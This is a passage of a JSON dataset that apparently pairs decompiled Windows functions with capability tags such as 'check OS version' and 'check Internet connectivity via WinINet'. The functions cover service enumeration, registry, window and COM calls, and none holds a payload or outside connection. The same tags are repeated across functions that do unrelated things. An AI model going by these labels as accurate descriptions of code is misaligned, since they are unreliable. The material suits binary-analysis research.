uStack48 = 0x421d4f;\n                    iStack44 = iVar3;\n                    sub.advapi32.dll_RegCloseKey_1();\n                    return;\n                }\n                *in_FS_OFFSET = uStack36;\n                puStack28 = 0x421d75;\n                uStack36 = 0x421d6d;\n                iStack32 = iVar2;\n                sub.advapi32.dll_RegCloseKey_1();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 537
    },
    "00422280": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00422280(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    char **ppcVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    bool bVar5;\n    uint uStackY18476;\n    uint uStackY18472;\n    uchar *puStackY18468;\n    uint *puStackY18464;\n    uint *puStackY18460;\n    char *apcStackY18456 [3048];\n    uint uStackY6264;\n    uint uStackY6256;\n    uint uStackY6252;\n    uchar *puStackY6248;\n    uint uStackY6244;\n    uint *puStackY6240;\n    uint *puStackY6236;\n    uint *puStackY6232;\n    int32_t iStackY6228;\n    uint uStackY6224;\n    uchar *arg_8h;\n    int32_t iStack6216;\n    uint uStack6212;\n    uchar *puStack6208;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t hSCManager;\n    int32_t *var_4h;\n    \n    puStack6208 = &stack0xfffffffc;\n    piVar1 = 0x4;\n    do {\n        piVar2 = piVar1;\n        piVar1 = piVar2 + -1;\n    } while (piVar2 + -1 != NULL);\n    uStackY18476 = 0;\n    puStackY18468 = NULL;\n    uStackY18472 = 0;\n    puStackY18464 = NULL;\n    puStackY18460 = NULL;\n    uStack6212 = 0x422468;\n    iStack6216 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffe7b8;\n    var_4h = piVar2;\n    fcn.0040546c();\n    uStackY6224 = 0;\n    iStackY6228 = 0;\n    puStackY6232 = 0x4222e7;\n    hSCManager = sub.advapi32.dll_OpenSCManagerA();\n    if (hSCManager != 0) {\n        var_14h = 0;\n        do {\n            puStackY6232 = &fcn.00422280::var_14h;\n            puStackY6236 = &fcn.00422280::var_10h;\n            puStackY6240 = &fcn.00422280::var_ch;\n            uStackY6244 = 0x4800;\n            puStackY6248 = &stack0xffffb7e8;\n            uStackY6252 = 3;\n            uStackY6256 = 0x13f;\n            iStackY6228 = hSCManager;\n            uStackY6264 = 0x422321;\n            sub.advapi32.dll_EnumServicesStatusA();\n            if (-1 < var_10h + -1) {\n                ppcVar3 = &stack0xffffb7e8;\n                iVar4 = var_10h;\n                do {\n                    bVar5 = *ppcVar3 == NULL;\n                    if (!bVar5) {\n                        bVar5 = **ppcVar3 == '\\0';\n                    }\n                    if (bVar5) {\n                        puStackY6232 = 0x42234b;\n                        fcn.00405738();\n                    }\n                    else {\n                        puStackY6232 = *piVar2;\n                        puStackY6236 = 0x42235c;\n                        fcn.00405664();\n                        puStackY6236 = puStackY18460;\n                        puStackY6240 = 0x422480;\n                        uStackY6244 = 0x422373;\n                        fcn.00405800();\n                    }\n                    bVar5 = ppcVar3[1] == NULL;\n                    if (!bVar5) {\n                        bVar5 = *ppcVar3[1] == '\\0';\n                    }\n                    if (bVar5) {\n                        puStackY6232 = 0x42238b;\n                        fcn.00405738();\n                    }\n                    else {\n                        puStackY6232 = *piVar2;\n                        puStackY6236 = 0x42239d;\n                        fcn.00405664();\n                        puStackY6236 = puStackY18464;\n                        puStackY6240 = 0x422480;\n                        uStackY6244 = 0x4223b4;\n                        fcn.00405800();\n                    }\n                    puStack6208 = 0x4223c3;\n                    fcn.00405664();\n                    puStack6208 = 0x4223d4;\n                    fcn.00421ee4();\n                    puStack6208 = puStackY18468;\n                    uStack6212 = 0x422480;\n                    iStack6216 = 0x4223eb;\n                    fcn.00405800();\n                    iStack6216 = *piVar2;\n                    arg_8h = &stack0xffffb7d4;\n                    uStackY6224 = 0x422401;\n                    fcn.00405664();\n                    uStackY6224 = 0x422410;\n                    fcn.004220f8(arg_8h);\n                    uStackY6224 = uStackY18476;\n                    iStackY6228 = 0x42248c;\n                    puStackY6232 = 0x422427;\n                    fcn.00405800();\n                    ppcVar3 = ppcVar3 + 9;\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != 0);\n            }\n        } while (var_ch != 0);\n        if (hSCManager != 0) {\n            iStackY6228 = hSCManager;\n            puStackY6236 = 0x42244a;\n            sub.advapi32.dll_CloseServiceHandle();\n        }\n    }\n    *in_FS_OFFSET = iStackY6228;\n    uStackY6224 = 0x422467;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1356
    },
    "0042279c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042279c(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.004075b8();\n    if (*(iVar1 + 0x10) != 0) {\n        iVar1 = fcn.004075b8();\n        iVar1 = sub.user32.dll_IsWindow(*(iVar1 + 0x10));\n        if (iVar1 != 0) goto code_r0x00422833;\n    }\n    do {\n        uVar2 = sub.user32.dll_FindWindowExA();\n        iVar1 = fcn.004075b8();\n        *(iVar1 + 0x10) = uVar2;\n        fcn.004075b8();\n        iVar1 = fcn.004075b8();\n        if (*(iVar1 + 0x10) == 0) break;\n        iVar1 = fcn.004075b8(0);\n        iVar1 = sub.user32.dll_GetWindowThreadProcessId(*(iVar1 + 0x10));\n        iVar3 = sub.kernel32.dll_GetCurrentThreadId_1();\n    } while (iVar1 != iVar3);\ncode_r0x00422833:\n    iVar1 = fcn.004075b8();\n    return *(iVar1 + 0x10);\n}\n",
        "token_count": 286
    },
    "00422940": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00422940(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x422978);\n    if (iVar1 != 0) {\n        *0x4aa9f8 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x422984);\n    }\n    if (*0x4aa9f8 == NULL) {\n        *0x4aa9f8 = fcn.0042285c;\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "004229a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004229a0(uint arg_8h, uint arg_ch)\n\n{\n    if (*0x4aa9f8 == NULL) {\n        fcn.00422940();\n    }\n    (**0x4aa9f8)();\n    return;\n}\n",
        "token_count": 60
    },
    "004229dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.004229dc(uchar param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uchar extraout_CL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n        param_1 = extraout_CL;\n    }\n    fcn.00404610();\n    *(in_EAX + 0xc) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 185
    },
    "00422e20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422e20(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    char in_DL;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        puStack56 = 0x422e3d;\n        in_EAX = fcn.00404964();\n    }\n    uStack60 = 0x422eca;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    fcn.00405504();\n    fcn.0040d1e4();\n    arg_8h_00 = 0;\n    fcn.00407480();\n    fcn.0040aea8(arg_8h_00);\n    fcn.0040db84(arg_8h);\n    *(in_EAX + 0xc) = arg_ch;\n    *in_FS_OFFSET = arg_8h;\n    uStack64 = 0x422ed1;\n    fcn.0040546c();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 304
    },
    "00423b5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00423b5c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uchar auStack76 [4];\n    int32_t iStack72;\n    int32_t iStack64;\n    uint arg_8h_00;\n    uint arg_ch;\n    uint arg_10h;\n    uint arg_14h;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x423c21;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    if (in_EAX == -0x7ffdfff7) {\n        arg_14h = *(in_EDX + 0x1c);\n        puStack32 = &stack0xfffffffc;\n        fcn.004056f4();\n        arg_10h = 0;\n        fcn.004056f4();\n        arg_ch = 0;\n        arg_8h_00 = *(in_EDX + 0x10);\n        fcn.004056f4();\n        iStack64 = fcn.00422ef4(arg_8h_00, arg_ch, arg_10h, arg_14h);\n        if (arg_8h != '\\0') {\n            fcn.00406110();\n        }\n    }\n    else {\n        arg_10h = 0;\n        iStack64 = fcn.00422e20(0, in_EAX);\n    }\n    if (in_ECX != 0) {\n        iStack72 = iStack64;\n        if (iStack64 == 0) {\n            iStack72 = fcn.00405460();\n        }\n    // WARNING: Could not recover jumptable at 0x00404ed5. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x4a6014)(0xeedfade, 1, 7, auStack76);\n        return;\n    }\n    fcn.00404eb4();\n    *in_FS_OFFSET = arg_10h;\n    uStack40 = 0x423c28;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 538
    },
    "00423e88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00423e88(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x423efe;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x4aa9fc = *0x4aa9fc + 1;\n    if (*0x4aa9fc == 0) {\n        *0x4aaa00 = 1;\n        fcn.00404640();\n        **0x4a5010 = 0;\n        **0x4a4c14 = 0;\n        **0x4a4f9c = 0;\n        if (*0x4aaa0c != '\\0') {\n            sub.ole32.dll_CoUninitialize();\n        }\n        fcn.00406024();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 225
    },
    "00424894": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424894(int32_t arg_8h, uint noname_1, uint noname_2, int32_t *arg_14h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    int32_t iStack24;\n    uchar *puStack20;\n    uchar *var_8h;\n    int32_t var_4h;\n    \n    puStack20 = 0x4248a6;\n    fcn.00406fb0();\n    iStack24 = 0x42491c;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    piStack32 = arg_14h;\n    puStack20 = &stack0xfffffffc;\n    var_4h = (**(*arg_14h + 0x10))();\n    if (0 < var_4h) {\n        (**(*arg_14h + 0xc))(arg_14h, &fcn.00424894::var_8h);\n        if (*(arg_8h + 8) == 0) {\n            puStack20 = var_8h;\n            iStack24 = var_4h;\n            piStack28 = 0x402;\n            piStack32 = *(**0x4a4f3c + 4);\n            sub.user32.dll_SendMessageA();\n        }\n        else {\n            puStack20 = 0x424904;\n            (**(arg_8h + 8))();\n        }\n    }\n    *in_FS_OFFSET = piStack32;\n    iStack24 = 0x424923;\n    piStack28 = 0x42491b;\n    fcn.00406f3c();\n    return;\n}\n",
        "token_count": 390
    },
    "0042492c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042492c(int32_t arg_8h, uint noname_1, uint noname_2, uint arg_14h, int32_t arg_18h)\n\n{\n    if (0 < arg_18h) {\n        if (*(arg_8h + 8) == 0) {\n            sub.user32.dll_SendMessageA(*(**0x4a4f3c + 4), 0x402, arg_18h, arg_14h);\n        }\n        else {\n            (**(arg_8h + 8))();\n        }\n    }\n    return 0;\n}\n",
        "token_count": 137
    },
    "00424784": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00424842)\n// WARNING: Removing unreachable block (ram,0x0042484e)\n// WARNING: Removing unreachable block (ram,0x00424844)\n\nvoid fcn.00424784(void)\n\n{\n    uchar *puVar1;\n    int32_t **in_EAX;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x424882;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puVar1 = &stack0xfffffffc;\n    if (*in_EAX == NULL) {\n        puStack48 = 0x4247b8;\n        piVar2 = fcn.00404610();\n        *in_EAX = piVar2;\n        puVar1 = puStack36;\n    }\n    puStack36 = puVar1;\n    uStack52 = 0x4247d9;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    (**(**in_EAX + 0x44))();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x4247f2;\n    puStack48 = fcn.00406f3c();\n    uStack52 = *0x4a4dd0;\n    uStack56 = 1;\n    uVar5 = *0x4a4ed0;\n    uVar3 = sub.ole32.dll_CoCreateInstance(*0x4a4ed0, 0);\n    if ((uVar3 & 0x80000000) == 0) {\n        fcn.00406f3c();\n        uVar4 = fcn.00406f3c(0);\n        (**(_pe_dos_header + 0xc))(0, *0x4a50c8, uVar4);\n    }\n    *in_FS_OFFSET = uVar5;\n    uStack56 = 0x424889;\n    fcn.0040546c();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    return;\n}\n",
        "token_count": 577
    },
    "00424a48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00424a48(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff5c;\n    uint uStack104;\n    uint uStack100;\n    uchar *puStack96;\n    uint var_49h;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint var_38h;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    \n    puStack96 = 0x424a66;\n    var_49h._0_1_ = param_2;\n    fcn.00405f08();\n    uStack100 = 0x424c7a;\n    uStack104 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff98;\n    puStack96 = &stack0xfffffffc;\n    uVar1 = fcn.00406f3c();\n    uVar2 = sub.ole32.dll_CoCreateInstance(*0x4a4f10, 0, 3, *0x4a5100, uVar1);\n    if ((uVar2 & 0x80000000) == 0) {\n        uVar1 = fcn.00406f3c();\n        uVar2 = sub.ole32.dll_CoCreateInstance(*0x4a4cd4, 0, 1, 0x424c8c, uVar1);\n        if ((uVar2 & 0x80000000) == 0) {\n            uVar1 = fcn.00406f3c();\n            in_stack_ffffff5c = *0x4a4e10;\n            uVar2 = sub.ole32.dll_CoCreateInstance(*0x4a4e10, 0, 1, *0x4a4b94, uVar1);\n            if ((uVar2 & 0x80000000) == 0) {\n                uVar1 = fcn.00406f3c();\n                uVar2 = (****(in_EAX + 0x24))(*(in_EAX + 0x24), *0x4a5030, uVar1);\n                if ((uVar2 & 0x80000000) == 0) {\n                    (**(**(in_EAX + 0x34) + 0x18))(*(in_EAX + 0x34), 0);\n                    if (var_49h != '\\0') {\n                        fcn.00403ae4();\n                        unique0x00006400 = **0x4a5048;\n                        uStack72 = (*0x4a5048)[1];\n                        uStack68 = (*0x4a5048)[2];\n                        uStack64 = (*0x4a5048)[3];\n                        var_38h = **0x4a4f64;\n                        uStack56 = (*0x4a4f64)[1];\n                        uStack52 = (*0x4a4f64)[2];\n                        uStack48 = (*0x4a4f64)[3];\n                        uVar2 = (**(**(in_EAX + 0x34) + 0x10))(*(in_EAX + 0x34), &fcn.00424a48::var_49h + 1);\n                        if ((uVar2 & 0x80000000) != 0) goto code_r0x00424c5e;\n                    }\n                    if (*(in_EAX + 0x3c) == 0) {\n                        uVar1 = fcn.00404610();\n                        *(in_EAX + 0x3c) = uVar1;\n                        uVar1 = fcn.00404610();\n                        *(*(in_EAX + 0x3c) + 0xc) = uVar1;\n                        fcn.00406f54();\n                    }\n                    (**(**(in_EAX + 0x34) + 0x24))(*(in_EAX + 0x34), *(in_EAX + 0x40), param_1);\n                    uVar1 = fcn.00406f3c();\n                    in_stack_ffffff5c = *0x4a4e68;\n                    uVar2 = sub.ole32.dll_CoCreateInstance(*0x4a4e68, 0, 3, *0x4a4b78, uVar1);\n                    if ((uVar2 & 0x80000000) == 0) {\n                        uVar1 = fcn.00406f3c();\n                        uVar2 = (****(in_EAX + 0x14))(*(in_EAX + 0x14), *0x4a4c0c, uVar1);\n                        if ((uVar2 & 0x80000000) == 0) {\n                            uVar1 = fcn.00406f3c();\n                            uVar2 = (****(in_EAX + 0x14))(*(in_EAX + 0x14), *0x4a5098, uVar1);\n                            if ((uVar2 & 0x80000000) == 0) {\n                                uVar1 = fcn.00406f3c();\n                                uVar2 = (****(in_EAX + 0x14))(*(in_EAX + 0x14), *0x4a4c88, uVar1);\n                                if ((uVar2 & 0x80000000) == 0) {\n                                    (**(**(in_EAX + 0x10) + 0x34))(*(in_EAX + 0x10), *(in_EAX + 4), 0x8001, 0);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x00424c5e:\n    *in_FS_OFFSET = in_stack_ffffff5c;\n    fcn.00405fd8(0x424c81);\n    return;\n}\n",
        "token_count": 1342
    },
    "00424e8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00424f6a)\n// WARNING: Removing unreachable block (ram,0x00424f6e)\n// WARNING: Removing unreachable block (ram,0x00424fb3)\n\nvoid __cdecl fcn.00424e8c(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = 0x424eae;\n    fcn.004058ec();\n    uStack56 = 0x424fe7;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.0040546c();\n    fcn.00409a78();\n    fcn.00405504();\n    if (in_EDX == 0) {\n        fcn.00405504();\n    }\n    if (arg_8h != 0) {\n        fcn.00406f3c();\n        uStack80 = *0x4a4ed0;\n        uVar1 = sub.ole32.dll_CoCreateInstance();\n        if ((uVar1 & 0x80000000) == 0) {\n            fcn.00406f3c();\n            fcn.00406f3c();\n            (**(_pe_dos_header + 0xc))(0);\n        }\n    }\n    *in_FS_OFFSET = uStack80;\n    fcn.0040546c();\n    fcn.00406f3c();\n    fcn.0040546c();\n    fcn.00406f3c();\n    return;\n}\n",
        "token_count": 440
    },
    "00425008": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00425008(void)\n\n{\n    int32_t in_EAX;\n    uint uStack20;\n    uint uStack16;\n    \n    if (*(in_EAX + 8) != 0) {\n        sub.user32.dll_GetClientRect(*(in_EAX + 4), &uStack20);\n        (**(**(in_EAX + 8) + 0x9c))(*(in_EAX + 8), 0, 0, uStack20, uStack16);\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "00425088": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00425088(uint param_1, char param_2)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar7;\n    int32_t *piStack60;\n    uint uStack56;\n    uchar *puStack52;\n    int32_t *piStack48;\n    uint uStack44;\n    uint uStack40;\n    int32_t *piStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_5h;\n    \n    if (*(in_EAX + 0x28) == 0) {\n        uStack28 = 0x4250ab;\n        uStack28 = fcn.00406f3c();\n        uStack32 = *0x4a4b70;\n        piStack36 = *(in_EAX + 0x38);\n        uStack40 = 0x4250bd;\n        iVar3 = (***piStack36)();\n        if (iVar3 != 0) {\n            uStack28 = 0x4250cc;\n            fcn.00406f3c();\n        }\n    }\n    if (*(in_EAX + 0x30) == 0) {\n        uStack28 = 0x4250e0;\n        uStack28 = fcn.00406f3c();\n        uStack32 = *0x4a4c4c;\n        piStack36 = *(in_EAX + 0x38);\n        uStack40 = 0x4250f2;\n        iVar3 = (***piStack36)();\n        if (iVar3 != 0) {\n            uStack28 = 0x425101;\n            fcn.00406f3c();\n        }\n    }\n    uStack28 = 0x425264;\n    uStack32 = *(in_EAX + 0x38);\n    piStack36 = *(in_EAX + 0x14);\n    uStack40 = 0x425119;\n    uVar4 = (**(*piStack36 + 0xc))();\n    if ((uVar4 & 0x80000000) == 0) {\n        uStack40 = 0x425280;\n        uStack44 = *(in_EAX + 0x24);\n        piStack48 = *(in_EAX + 0x14);\n        puStack52 = 0x42513f;\n        uVar4 = (**(*piStack48 + 0xc))();\n        if ((uVar4 & 0x80000000) == 0) {\n            if (param_2 == '\\0') {\n                puStack52 = 0x4252a0;\n                uStack56 = *(in_EAX + 0x2c);\n                piStack60 = *(in_EAX + 0x14);\n                uVar4 = (**(*piStack60 + 0xc))();\n                if ((uVar4 & 0x80000000) != 0) {\n                    return uVar4;\n                }\n            }\n            puStack52 = 0x425183;\n            puVar5 = fcn.00402ef0();\n            puStack52 = 0x42518f;\n            puVar6 = fcn.00402ef0();\n            puVar2 = *0x4a4e7c;\n            puVar1 = *0x4a4e7c + 1;\n            *puVar5 = **0x4a4e7c;\n            puVar5[1] = *puVar1;\n            puVar5[2] = puVar2[2];\n            puVar5[3] = puVar2[3];\n            puVar2 = *0x4a5048;\n            puVar1 = *0x4a5048 + 1;\n            *puVar6 = **0x4a5048;\n            puVar6[1] = *puVar1;\n            puVar6[2] = puVar2[2];\n            puVar6[3] = puVar2[3];\n            uStack56 = 0x425210;\n            piStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            if (param_2 == '\\0') {\n                piVar7 = *(in_EAX + 0x18);\n                puStack52 = &stack0xfffffffc;\n                uVar4 = (**(*piVar7 + 0x1c))\n                                  (piVar7, puVar5, puVar6, *(in_EAX + 0x38), *(in_EAX + 0x24), *(in_EAX + 0x2c));\n            }\n            else {\n                piVar7 = *(in_EAX + 0x18);\n                puStack52 = &stack0xfffffffc;\n                uVar4 = (**(*piVar7 + 0x1c))(piVar7, puVar5, puVar6, *(in_EAX + 0x38), *(in_EAX + 0x24), 0);\n            }\n            *in_FS_OFFSET = piVar7;\n            if ((uVar4 & 0x80000000) == 0) {\n                if ((param_2 != '\\0') && (uVar4 = fcn.00425040(),  (uVar4 & 0x80000000) != 0)) {\n                    return uVar4;\n                }\n                uVar4 = (**(**(in_EAX + 0xc) + 0x1c))(*(in_EAX + 0xc));\n                *(in_EAX + 0x1c) = 2;\n            }\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 1281
    },
    "004252c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
